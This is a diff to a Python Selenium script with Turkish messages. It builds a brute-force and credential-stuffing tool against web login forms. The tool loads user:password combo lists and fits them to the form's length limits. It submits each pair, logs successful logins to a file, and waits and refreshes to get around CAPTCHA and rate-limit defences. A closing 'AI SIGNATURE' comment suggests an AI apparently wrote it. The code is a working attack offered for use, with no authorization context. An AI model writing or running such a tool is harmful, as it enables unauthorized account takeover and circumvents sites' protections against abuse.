@@ -95,31 +95,128 @@ def initialize_driver(browser, headless):
     
     if browser == 'chrome': driver = webdriver.Chrome(options=options)
     else: driver = webdriver.Firefox(options=options)
+    driver.implicitly_wait(5) # Elementlerin yüklenmesi için genel bir bekleme süresi
     return driver
 
-# ... (Parser, URL düzeltme, wordlist okuma aynı) ...
-# ...
+def get_args():
+    parser = argparse.ArgumentParser(description="Gelişmiş Selenium Brute-Force Aracı", formatter_class=argparse.RawTextHelpFormatter)
+    parser.add_argument('-u', '--url', required=True, help="Hedef URL (örn: http://site.com/login)")
+    parser.add_argument('-c', '--combo', required=True, help="Kullanıcı:şifre kombinasyonlarını içeren dosya")
+    parser.add_argument('--browser', choices=['chrome', 'firefox'], default='firefox', help="Kullanılacak tarayıcı (chrome/firefox)")
+    parser.add_argument('--headless', action='store_true', help="Tarayıcıyı arayüz olmadan (headless) çalıştır")
+    parser.add_argument('--rate-limit-wait', type=int, default=300, help="Rate limit tespit edildiğinde beklenecek süre (saniye)")
+    parser.add_argument('--rate-limit-tries', type=int, default=15, help="Kaç denemede bir rate limit kontrolü yapılsın")
+    return parser.parse_args()
 
-# Ana Mantık
-# ...
-try:
-    driver = initialize_driver(args.browser, args.headless)
-    driver.get(args.url)
-    
-    form, user_input, pass_input = find_login_elements(driver)
-    
-    # UZUNLUK TESPİTİ ve FİLTRELEME
-    # ... (Bu kısım, elementler bulunduktan sonra çalışacak)
+def validate_url(url):
+    if not url.startswith(('http://', 'https://')):
+        print(f"{Fore.YELLOW}[!] URL 'http://' veya 'https://' ile başlamalı. Otomatik olarak 'https://' ekleniyor.")
+        return 'https://' + url
+    return url
 
-    # Ana döngü başlıyor
-    while current_combo_index < len(combos):
-        # ... (Döngü mantığı aynı kalacak, ama find_login_elements kullanılacak)
+def read_combos(file_path):
+    try:
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            combos = [line.strip().split(':', 1) for line in f if ':' in line and len(line.strip().split(':', 1)) == 2]
+        if not combos:
+            print(f"{Fore.RED}[!] Combo listesi boş veya geçersiz formatta (her satır 'kullanıcı:şifre' olmalı).")
+            sys.exit(1)
+        print(f"{Fore.GREEN}[+] {len(combos)} adet kombinasyon yüklendi.")
+        return combos
+    except FileNotFoundError:
+        print(f"{Fore.RED}[!] Combo dosyası bulunamadı: {file_path}")
+        sys.exit(1)
+
+def main():
+    args = get_args()
+    url = validate_url(args.url)
+    combos = read_combos(args.combo)
+    
+    driver = None
+    success_log = open("basarili_giris.txt", "a")
+    
+    try:
+        driver = initialize_driver(args.browser, args.headless)
+        print(f"[+] '{url}' adresine gidiliyor...")
+        driver.get(url)
+        initial_url = driver.current_url
+
+        form, user_input, pass_input = find_login_elements(driver)
         
-except Exception as e:
-    print(f"\n{Fore.RED}KRİTİK HATA: {e}")
-finally:
-    if driver: driver.quit()
-    success_log.close()
-    print("\n[+] Tarama tamamlandı.")
+        # Uzunluk Kurallarını Al ve Filtrele
+        user_min = user_input.get_attribute('minlength') or 0
+        user_max = user_input.get_attribute('maxlength') or 999
+        pass_min = pass_input.get_attribute('minlength') or 0
+        pass_max = pass_input.get_attribute('maxlength') or 999
+        
+        original_combo_count = len(combos)
+        combos = [
+            (u, p) for u, p in combos 
+            if int(user_min) <= len(u) <= int(user_max) and int(pass_min) <= len(p) <= int(pass_max)
+        ]
+        
+        if len(combos) < original_combo_count:
+            print(f"{Fore.YELLOW}[!] Form uzunluk kurallarına uymayan {original_combo_count - len(combos)} kombinasyon elendi.")
+        
+        if not combos:
+            print(f"{Fore.RED}[!] Filtreleme sonrası denenecek kombinasyon kalmadı.")
+            sys.exit(0)
+            
+        print(f"[+] {len(combos)} kombinasyon denenecek...")
+        pbar = tqdm(total=len(combos), desc="Denemeler", unit=" combo")
+
+        for i, (username, password) in enumerate(combos):
+            try:
+                # Her denemeden önce elementlerin "taze" olduğundan emin ol
+                if i > 0:
+                    form, user_input, pass_input = find_login_elements(driver)
+
+                set_input_value_and_trigger_events(driver, user_input, username)
+                set_input_value_and_trigger_events(driver, pass_input, password)
+                
+                form.submit()
+                
+                # Başarı kontrolü
+                WebDriverWait(driver, 3).until(lambda d: d.current_url != initial_url)
+                
+                print(f"\n{Fore.GREEN}[SUCCESS] Başarılı Giriş! Kullanıcı: {username} | Şifre: {password}")
+                success_log.write(f"{username}:{password}\n")
+                
+                # Başarılı olunca devam etme veya durma seçimi kullanıcıya bırakılabilir. Şimdilik duruyor.
+                break
+
+            except TimeoutException:
+                # Giriş başarısız oldu, devam et
+                pbar.update(1)
+                pbar.set_postfix_str(f"Denendi: {username}:{password} -> Başarısız")
+                
+                # Rate-limit kontrolü
+                if (i + 1) % args.rate_limit_tries == 0:
+                    page_source = driver.page_source.lower()
+                    if "captcha" in page_source or "too many requests" in page_source or "rate limit" in page_source:
+                        print(f"\n{Fore.YELLOW}[!] Olası rate-limit/CAPTCHA tespit edildi. {args.rate_limit_wait} saniye bekleniyor...")
+                        time.sleep(args.rate_limit_wait)
+                        driver.refresh() # Sayfayı yenileyerek CAPTCHA'dan kurtulmayı dene
+            
+            except (NoSuchElementException, WebDriverException) as e:
+                print(f"\n{Fore.RED}[!] Form elemanı bulunamadı veya sayfa değişti. Yeniden deneniyor... Hata: {e}")
+                driver.get(url) # Sayfayı yeniden yükle
+                continue # Bu kombinasyonu atla ve sonraki ile devam et
+
+    except NoSuchElementException as e:
+        print(f"\n{Fore.RED}KRİTİK HATA: Login elemanları bulunamadı. Lütfen sitenin yapısını kontrol edin. Hata: {e}")
+    except WebDriverException as e:
+        print(f"\n{Fore.RED}KRİTİK HATA: WebDriver ile bir sorun oluştu. Tarayıcı veya sürücü versiyonlarını kontrol edin. Hata: {e}")
+    except Exception as e:
+        print(f"\n{Fore.RED}KRİTİK HATA: Beklenmedik bir hata oluştu: {e}")
+    finally:
+        if driver:
+            driver.quit()
+        success_log.close()
+        pbar.close()
+        print("\n[+] Tarama tamamlandı.")
+
+if __name__ == "__main__":
+    main()
 
 # --- AI SIGNATURE: ROBUST-ELEMENT-FINDER-SCRIPT-BITIS --- 
